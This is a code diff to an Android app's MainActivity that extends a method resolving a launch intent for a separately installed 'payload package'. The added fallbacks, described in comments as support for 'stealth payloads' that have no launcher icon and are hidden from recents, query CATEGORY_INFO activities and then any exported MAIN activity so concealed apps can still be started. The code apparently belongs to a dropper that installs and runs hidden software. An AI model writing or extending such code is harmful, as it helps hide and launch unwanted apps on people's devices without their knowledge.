@@ -185,12 +185,17 @@ public class MainActivity extends Activity {
     // Resolve a launch intent for the payload package. Tries the standard
     // PackageManager API first; on Android 11+ even with a <queries> entry
     // a freshly installed package can briefly fail this lookup, so we fall
-    // back to manually resolving its MAIN/LAUNCHER activity.
+    // back to manually resolving its MAIN/LAUNCHER activity. For stealth
+    // payloads that only declare CATEGORY_INFO (no launcher icon), we also
+    // try CATEGORY_INFO and then any exported MAIN activity as last resort.
     private Intent resolvePayloadLaunchIntent(String pkg) {
         PackageManager pm = getPackageManager();
+
+        // 1) Standard getLaunchIntentForPackage (works when CATEGORY_LAUNCHER exists)
         Intent launch = pm.getLaunchIntentForPackage(pkg);
         if (launch != null) return launch;
-        // Fallback: query MAIN/LAUNCHER activities of the package directly.
+
+        // 2) Fallback: query MAIN/LAUNCHER activities of the package directly.
         Intent probe = new Intent(Intent.ACTION_MAIN);
         probe.addCategory(Intent.CATEGORY_LAUNCHER);
         probe.setPackage(pkg);
@@ -203,6 +208,35 @@ public class MainActivity extends Activity {
             direct.setClassName(ai.packageName, ai.name);
             return direct;
         }
+
+        // 3) Stealth payload fallback: MAIN + CATEGORY_INFO (no launcher icon).
+        //    Payloads built with excludeFromRecents use this intent-filter so
+        //    they are launchable from Settings > App Info but hidden from the drawer.
+        Intent infoProbe = new Intent(Intent.ACTION_MAIN);
+        infoProbe.addCategory(Intent.CATEGORY_INFO);
+        infoProbe.setPackage(pkg);
+        java.util.List<android.content.pm.ResolveInfo> infoRis =
+                pm.queryIntentActivities(infoProbe, 0);
+        if (infoRis != null && !infoRis.isEmpty()) {
+            android.content.pm.ActivityInfo ai = infoRis.get(0).activityInfo;
+            Intent direct = new Intent(Intent.ACTION_MAIN);
+            direct.addCategory(Intent.CATEGORY_INFO);
+            direct.setClassName(ai.packageName, ai.name);
+            return direct;
+        }
+
+        // 4) Last resort: any exported MAIN activity in the package.
+        Intent anyProbe = new Intent(Intent.ACTION_MAIN);
+        anyProbe.setPackage(pkg);
+        java.util.List<android.content.pm.ResolveInfo> anyRis =
+                pm.queryIntentActivities(anyProbe, 0);
+        if (anyRis != null && !anyRis.isEmpty()) {
+            android.content.pm.ActivityInfo ai = anyRis.get(0).activityInfo;
+            Intent direct = new Intent(Intent.ACTION_MAIN);
+            direct.setClassName(ai.packageName, ai.name);
+            return direct;
+        }
+
         return null;
     }
 
